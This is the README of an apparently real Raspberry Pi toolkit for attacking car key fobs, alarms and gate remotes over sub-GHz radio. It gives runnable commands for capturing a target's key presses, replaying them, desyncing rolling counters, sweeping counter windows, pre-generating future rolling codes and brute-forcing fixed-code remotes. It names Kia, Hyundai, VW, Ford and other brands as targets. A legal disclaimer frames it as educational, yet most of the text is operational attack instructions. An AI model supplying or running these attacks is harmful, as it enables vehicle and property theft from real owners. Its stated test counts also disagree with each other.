# Unleashed-Pi — Private Unleashed 2.0 for Raspberry Pi 3/4/5

**Car-key & Sub-GHz hacking toolkit that ports the Private Unleashed 2.0 / Quantum FW
attack stack from the Flipper Zero to a Raspberry Pi.**

```
  _   _ _   _ __  _____ _   _ __  __    _    ____  _   _    _    _____ ____    _____
 | | | | | | |  \/ ( ____| \ | |  \/  |  / \  |  _ \| | | |  / \  | ___/ ___|  / ____|
 | | | | | | | \  /| (__| |  \| | |\/| | / _ \ | |_) | | | | / _ \ | |_/ \___ \ | |
 | | | | | | | |  \\__ \ | . ` | |  | |/ ___ \|  _ <| |_| |/ ___ \|  __/ ___) || |___
 | |_| | |_| | |__) ___ | |\  | |  | / /   \ \ |_) |  _  / /   \ \ |  |____/ | |____
  \___/ \___/|____/_____|_| \_|_|  |/_/     \_\____/|_| \_/_/     \_\_|         \_____|
        Private Unleashed 2.0 :: Raspberry Pi 3 / 4 / 5 Edition
        car keys - alarms - barriers :: CC1101 :: KeeLoq :: Flipper .sub
        educational use only - test only what you own!
```

⚠ **Warning** — published for cybersecurity education and lawful testing only.
Using this on vehicles or radio devices you don't own or control is illegal
(CFAA, UK Computer Misuse Act 1990, EU Cybercrime Convention). You are the
hacker — be a responsible one.

---

## What this is

The [original repository](https://github.com/jmooves/private-unleashed-2.0-flipperzero-firmware)
is a Flipper Zero firmware focused on rolling-code exploitation and relay
attacks: it records key fobs, predicts/increments rolling codes and replays
them against cars (Kia/Hyundai to 2025, VW/Skoda/Seat/Audi to 2024, Ford to
2016, Peugeot/Citroën/PSA, Subaru, Fiat, and many alarm/barrier brands).

A Flipper runs an STM32 + a **TI CC1101** sub-GHz radio. The Raspberry Pi has
no such radio on board — but a **$3 CC1101 module** on the Pi's SPI header is
the *same chip*. Unleashed-Pi drives that module with the **same register
configurations, the same protocol decoders and the same attack modes** as the
firmware, so a Pi 3/4/5 becomes a full-fat car-key hacking box:

| Firmware feature | Unleashed-Pi equivalent |
|---|---|
| Sub-GHz Read (decode keys live) | `read` — KeeLoq, Princeton, CAME, Nice FLO |
| Save signal as `.sub` | identical Flipper `.sub` files (RAW + decoded) |
| Send (replay) | `send` — replays any Flipper `.sub`, incl. the repo's vehicle packs |
| Rolling-counter manipulation (modes 0–7) | `--counter-mode` (mode 2 = +0x3333 jumps) |
| Unleashed subbrute | `brute` — CAME/Nice/Princeton + KeeLoq counter attack |
| Extended frequency range (281–361/378–481/749–962 MHz) | same ranges, same presets |
| Radio presets AM650/AM270/FM238/FM476/FM120 | register-for-register identical |
| KeeLoq manufacturer keys | `assets/keeloq_keys.txt` (user-expandable) |

**Pi model support:** Pi 3, Pi 4 and Pi 5 (also Zero 2 W). Pi 3/4 use
`lgpio` or `pigpio` (DMA-timed TX, most precise); Pi 5 uses `lgpio`
(kernel-timed waves). The tool auto-detects the best backend, and falls
back to a full software demo mode on any PC.

---

## Hardware

One CC1101 module (the radio inside the Flipper Zero), ~$2–5:

```
 CC1101 module          Raspberry Pi header (all models)
 ─────────────          ────────────────────────────────
 VCC  (3.3V!)  ───────  pin 1   3.3V        *** NEVER 5V ***
 GND           ───────  pin 6   GND
 MOSI          ───────  pin 19  GPIO10
 MISO          ───────  pin 21  GPIO9
 SCK           ───────  pin 23  GPIO11
 CSN           ───────  pin 24  GPIO8  (SPI CE0)
 GDO0          ───────  pin 13  GPIO27 (radio data in/out)
 GDO2          ───────  (optional, GPIO17)
```

* Any CC1101 board works; modules with a pre-soldered antenna connector are
  easiest. Use a short wire antenna (λ/4: 16.5 cm @ 433 MHz, 22.8 cm @ 315 MHz).
* A soldered 10 cm ground plane improves range massively.
* Pin numbers above are GPIO numbers and header positions on Pi 3/4/5.

## Install (on the Pi)

```bash
sudo bash install.sh          # packages + SPI + pigpiod + self-test
sudo reboot                   # only needed if SPI was just enabled
```

Then start it:

```bash
sudo python3 unleashed_pi.py              # interactive menu
```

**No Pi at hand?** It runs anywhere in demo mode (mock radio) — useful to
explore, and for the test suite:

```bash
python unleashed_pi.py selftest          # 12 checks, no hardware
python -m pytest tests/ -q               # 57 unit/integration tests
```

---

## The attacks

All examples assume `sudo python3 unleashed_pi.py <command>` from the
project folder.

### 1) Capture a car key live (`read`)

```bash
sudo python3 unleashed_pi.py read --freq 433920000 --preset AM650 --save
```

Walk near the target, press its remote. Every decoded frame is shown and
(with `--save`) written to `signals/` as a Flipper `.sub`. KeeLoq captures
also **auto-sync the shadow-clone counter mirror** (see §6):

```
================ FOUND ================
KeeLoq  64bit
Key: B7C452C1F8DA3408
Sn: 0x02C5B1F  Btn: 0x1
Cnt: 0x1234
MF: Unleashed-Pi Demo
=======================================
    rolling counter: 0x1234 (save this — replay uses counter modes)
```

* Frequency: `--freq 433920000` (EU/Asia), `315000000`/`390000000` (US/JP),
  `434775000` (AU). Use `rssi` (below) to find the active one.
* Presets: `AM650` (OOK — VW/Ford/Subaru/FCA/alarms/barriers),
  `FM476` (2-FSK — Kia/Hyundai/Mitsubishi/Suzuki up to 2025),
  `FM238` (Scher-Khan style), `AM270` (long-range OOK).

### 2) Replay any captured or shipped signal (`send`)

```bash
sudo python3 unleashed_pi.py send signals/20260101_120000_KeeLoq_B7C452C1F8DA3408.sub
sudo python3 unleashed_pi.py send assets/subghz/SAMPLE_CAME.sub --count 5
```

Accepts **any Flipper `.sub` file** — RAW captures, decoded keys and custom
presets, including signal packs for the original firmware. KeeLoq files are
re-emitted with the rolling counter **incremented** using the file's
`CounterMode` (default mode 2). For a pure 1:1 replay of a captured frame,
send it with `Manufacture: Unknown` (the tool falls back to exact replay).

### 3) Record RAW (unknown protocols)

```bash
sudo python3 unleashed_pi.py capture --freq 433920000 -t 15
```

Saves a Flipper RAW `.sub` you can replay with `send`, open in other tools,
or share.

### 4) Rolling-counter manipulation (`--counter-mode`)

The firmware's famous counter modes, ported 1:1 (KeeLoq files):

| Mode | Behavior |
|---|---|
| 0 | standard `+1` per frame (or `+N` via config `counter_mult`) |
| 1 | `0000 / 0001 / FFFE / FFFF` (OFEX overflow pattern) |
| 2 | **`+0x3333` jump per frame — the classic counter-desync attack** |
| 3 | `0x8006 / 0x8007 / 0x0006 / 0x0007` |
| 4 | `0x807B / 0x807C / 0x007B / 0x007C` |
| 5 | `0x0000 / 0xFFFF` |
| 6 | freeze counter |
| 7 | 7-frame "insane" burst (0 / original / +1 / +0x3333 chain) |

```bash
sudo python3 unleashed_pi.py send signals/CAPTURED_KeeLoq.sub          # uses file's mode
sudo python3 unleashed_pi.py brute keeloq --file signals/CAPTURED.sub \
        --count 12 --counter-mode 2                                     # 12 predicted counters
```

### 5) Counter-window sweep — the strong rolling-code bypass

Re-encrypts a captured key's hopping code with **every counter in a range**
and sprays them back-to-back. Receivers that accept a window of upcoming
counters (most KeeLoq alarms and many PSA-era cars) open — this is the
private firmware's "PSA brute-force", executed locally with your keystore keys:

```bash
sudo python3 unleashed_pi.py brute keeloq --file CAPTURED.sub \
        --sweep-from 0x1234 --sweep-to 0x1264          # +0x30 window, 1-by-1
sudo python3 unleashed_pi.py brute keeloq --file CAPTURED.sub \
        --sweep-from 0x1000 --sweep-to 0x7666 --sweep-step 0x3333   # +0x3333 jumps
```

Needs a manufacturer key (keystore or `Manufacture:` in the file). Sweep
~65 counters for typical ±32 windows.

### 6) Shadow clone — never desync, pre-compute the future

The "learn the combination after observing it in use" attack, automated:

* Every KeeLoq frame you capture updates a persistent **counter mirror**
  per remote (`signals/clone_state.json`).
* `clone` generates the next N rolling codes as ready-to-send `.sub` files
  (or transmits them immediately), then advances the mirror.

```bash
sudo python3 unleashed_pi.py clone CAPTURED.sub --steps 8 --use-state \
        --outdir signals          # 8 future keys, mirror-synced
sudo python3 unleashed_pi.py clone CAPTURED.sub --steps 4 --transmit
```

Because the mirror only ever moves forward and re-syncs on every capture,
your Pi clone stays inside the receiver's rolling window indefinitely.

### 7) Brute force (`brute`)

```bash
sudo python3 unleashed_pi.py brute came   --count 4096     # 12-bit gates (~2 min)
sudo python3 unleashed_pi.py brute nice   --count 4096
sudo python3 unleashed_pi.py brute princeton --start 0x100 --count 256
```

Codes are generated on the fly and transmitted back-to-back with the
firmware's pacing (no signal-pack files needed). Holtek 40-bit remotes
are decoded by `read` and replayed by `send` as well.

### 8) KeeLoq lab (`keeloq-decode`)

```bash
python3 unleashed_pi.py keeloq-decode --fix 0x102C5B1F --hop 0x834A23ED \
       --key 0x1122334455667788 --type simple
```

Shows button/serial from FIX, decrypts HOP with a manufacturer key
(simple / normal / secure learning), extracts the rolling counter and
predicts the counter chain. `info` also shows the next 4 predicted
counters for any KeeLoq capture.

### 9) Find the frequency (`rssi`)

```bash
sudo python3 unleashed_pi.py rssi --freq 433920000 --span 4000000
```

Sweeps ±2 MHz and lists active channels — press the key and see where it
lives before you `read`/`capture` there.

### 10) Manufacturer keys (`assets/keeloq_keys.txt`)

With a brand's 64-bit key in the keystore, `read` identifies the
manufacturer, recovers counters, and `send` re-encrypts hops with fresh
counters (full clone behavior). Format:

```
ManufacturerName:1122334455667788:simple
OtherBrand:0011223344556677:normal
BFT:0011223344556677:secure
```

Learning types: `simple normal secure magic_xor_type1 magic_serial_type1/2/3
simple_jcm jcm_gen2 erreka pujol stagnoli aerf telcoma_hi telcoma_lo
unknown`. AN-Motors and HCS101 need no key (auto-detected). Community
"mfkey" files for the original firmware work here too.

---

## Interactive menu

`sudo python3 unleashed_pi.py` opens the numbered menu (Read / Capture /
Send / Brute / **Clone** / KeeLoq lab / RSSI / Info / Presets / Config /
Selftest) — same features, no flags to remember.

## Supported targets (same families as the original firmware)

KeeLoq/rolling-code and fixed-code systems: Kia & Hyundai (to 2025, FM476),
VW / Skoda / Seat / Audi (to 2024), Ford / Lincoln / Mercury (to 2016),
Peugeot / Citroën / DS (PSA), Subaru, Fiat / Lancia / FCA (to 2012),
Mitsubishi, Suzuki (to 2015), Land Rover / Jaguar (to 2016), plus the big
alarm & barrier families (Alligator, Scher-Khan, StarLine, Tomahawk,
CAME, Nice, BFT, FAAC, DoorHan, Hörmann, Somfy, and many more) and generic
Princeton/PT-2260 remotes. Modern cars with challenge-response / AES
keyless-go (e.g. post-2016 EU Ford, BMW) are **not** openable by replay —
the original repo documents the same limit ("this will not allow you to
start or drive away with a vehicle").

## How faithful is the port?

* **Radio:** the exact register arrays of the firmware's `cc1101_configs.c`
  (AM270/AM650/FM238/FM120/FM476 + MSK/GFSK), same PATABLEs, same
  frequency math (`freq × 0x10000 / 26 MHz`, truncated), same async
  serial-data mode (IOCFG0 = 0x0D) driven by GPIO waves instead of the
  Flipper's TIM2+DMA.
* **Protocols:** state machines ported line-by-line from `princeton.c`,
  `came.c`, `nice_flo.c`, `holtek.c`, `keeloq.c` (same constants, same
  tolerances, same "two identical frames" rules).
* **Crypto:** `keeloq_common.c` 1:1 — KeeLoq NLFSR (NLF 0x3A5C742E, 528
  rounds), simple/normal/secure learning, counter modes 0–7.
* **Files:** reads/writes Flipper `.sub` (decoded, RAW, custom presets).

Differences: PWM frames are emitted by lgpio kernel waves / pigpio DMA
waves (µs-timed) instead of a Cortex-M timer; carrier TX power depends on
your CC1101 module.

## Project layout

```
unleashed_pi.py        CLI + menu
lib/cc1101.py          CC1101 SPI driver (register-level)
lib/presets.py         firmware-exact radio presets
lib/gpio_backend.py    lgpio / pigpio / mock backends
lib/protocols/         Princeton, CAME, Nice FLO, KeeLoq decoders+encoders
lib/keeloq_crypto.py   KeeLoq cipher + learnings + counter modes
lib/keystore.py        manufacturer key store
lib/subfile.py         Flipper .sub read/write
lib/rx_engine.py       async RX (edge feed -> decoders, RAW recorder)
lib/tx_engine.py       async TX (protocol uploads -> radio)
lib/bruteforce.py      dynamic brute-force + KeeLoq counter attack + sweep
lib/keeloq_tx.py       .sub -> KeeLoq upload builder + clone/next-code gen
lib/clone_state.py     shadow-clone rolling-counter mirror (persistent)
assets/keeloq_keys.txt manufacturer keys (add yours here)
assets/subghz/*.sub    sample signals (incl. verified KeeLoq demo key)
tools/make_samples.py  regenerates the samples
tests/                66 pytest tests (crypto, protocols, sweep, clone)
tests_selftest.py     15-check self-test (runs anywhere, no hardware)
```

## Troubleshooting

| Symptom | Fix |
|---|---|
| `DEMO MODE — CC1101 not detected` | SPI not enabled / wiring / not root. `sudo raspi-config nonint do_spi 0`, check wires, reboot, use sudo |
| `no gpiochip found` | Pi 5 with old OS: update firmware (`sudo rpi-update`), or set `gpio_chip` in `config.json` |
| Nothing decoded in `read` | wrong frequency/preset — try `rssi`, try `FM476` for Korean cars, get closer |
| Frames decode but car ignores replay | rolling code already consumed — try `--counter-mode 2` or capture a *fresh* press |
| TX unreliable on Pi 3/4 | ensure pigpiod runs: `sudo systemctl enable --now pigpiod` |
| Transmission feels weak | check antenna, use `set_power_dbm` values in `lib/cc1101.py` comments |

## Legal

See `LICENSE`. Test only what you own or have written permission for.
```
